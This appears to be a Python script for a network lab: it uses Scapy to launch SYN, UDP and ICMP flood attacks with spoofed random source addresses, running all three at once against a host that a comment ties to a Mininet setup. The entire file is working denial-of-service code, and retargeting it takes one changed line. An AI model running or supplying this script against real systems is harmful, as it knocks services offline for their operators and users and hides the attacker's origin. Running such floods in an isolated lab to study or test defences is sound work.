from scapy.all import *
import time
import threading

def syn_flood(target_ip, target_port, duration=10):
    """ Generate SYN Flood attack """
    print(f"Starting SYN Flood attack on {target_ip}:{target_port} for {duration} seconds")
    start_time = time.time()
    while time.time() - start_time < duration:
        send(IP(src=RandIP(), dst=target_ip)/TCP(dport=target_port, flags='S'), verbose=False)
    print("SYN Flood attack finished.")

def udp_flood(target_ip, target_port, duration=10):
    """ Generate UDP Flood attack """
    print(f"Starting UDP Flood attack on {target_ip}:{target_port} for {duration} seconds")
    start_time = time.time()
    while time.time() - start_time < duration:
        send(IP(src=RandIP(), dst=target_ip)/UDP(dport=target_port)/Raw(load="X"*1024), verbose=False)
    print("UDP Flood attack finished.")

def icmp_flood(target_ip, duration=10):
    """ Generate ICMP Flood attack (Ping Flood) """
    print(f"Starting ICMP Flood attack on {target_ip} for {duration} seconds")
    start_time = time.time()
    while time.time() - start_time < duration:
        send(IP(src=RandIP(), dst=target_ip)/ICMP(), verbose=False)
    print("ICMP Flood attack finished.")

if __name__ == "__main__":
    target_ip = "10.0.0.2"  # Change to match Mininet host IP
    target_port = 80
    duration = 10  # Attack duration in seconds

    # Run all three attacks in parallel
    syn_thread = threading.Thread(target=syn_flood, args=(target_ip, target_port, duration))
    udp_thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration))
    icmp_thread = threading.Thread(target=icmp_flood, args=(target_ip, duration))

    syn_thread.start()
    udp_thread.start()
    icmp_thread.start()

    syn_thread.join()
    udp_thread.join()
    icmp_thread.join()

    print("Attack simulation complete.")
